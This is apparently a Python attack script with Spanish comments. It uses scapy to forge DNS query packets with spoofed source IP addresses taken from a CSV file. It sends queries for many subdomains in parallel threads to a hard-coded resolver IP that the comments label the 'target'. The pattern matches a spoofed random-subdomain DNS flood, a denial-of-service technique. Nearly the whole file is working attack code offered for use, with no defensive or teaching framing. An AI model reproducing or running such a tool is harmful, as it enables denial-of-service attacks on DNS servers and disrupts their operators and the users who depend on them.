import sys
sys.path.append(' /usr/local/lib/python3.8/dist-packages')
import csv
import concurrent.futures
from scapy.all import *

def read_subdomains_from_csv(csv_file):
    subdomains = []
    with open(csv_file, 'r') as csvfile:
        reader = csv.reader(csvfile)
        next(reader)  # omitir la fila de encabezado
        for row in reader:
            subdomains.append(row[0])
    return subdomains

def read_source_ips_from_csv(csv_file):
    source_ips = []
    with open(csv_file, 'r') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            source_ips.append(row['source_ip'])
    return source_ips

def query_dns(domain, subdomains, source_ips, resolver_address):
    try:
        # Formar y enviar las consultas DNS
        for subdomain, source_ip in zip(subdomains, source_ips):
            full_domain = f"{subdomain}.{domain}"
            packet = IP(src=source_ip, dst=resolver_address) / UDP() / DNS(rd=1, qd=DNSQR(qname=full_domain))
            send(packet, verbose=0)
            #print(f"Sent query for {full_domain} from {source_ip}")

    except Exception as e:
        print(f"Error: {e}")

def send_dns_queries(subdomains, domain, source_ips, resolver_address, block_size=1000):
    chunks = [subdomains[i:i + block_size] for i in range(0, len(subdomains), block_size)]

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(chunks)) as executor:
        futures = [executor.submit(query_dns, domain, chunk, source_ips, resolver_address) for chunk in chunks]

        # Esperar a que todas las consultas se completen
        concurrent.futures.wait(futures)

if __name__ == "__main__":
    domain_to_query = ""  # Dominio a consultar
    input_csv_file = "subdomains.csv"  # Nombre del archivo CSV
    source_ips_file = "source_ips.csv"  # Nombre del archivo CSV con las direcciones IP de origen
    resolver_ip = "181.78.113.169"  # Dirección IP del servidor DNS target

    subdomains_to_query = read_subdomains_from_csv(input_csv_file)
    source_ips_to_use = read_source_ips_from_csv(source_ips_file)

    send_dns_queries(subdomains_to_query, domain_to_query, source_ips_to_use, resolver_address=resolver_ip)

    print(f"Se enviaron {len(subdomains_to_query)} consultas.")
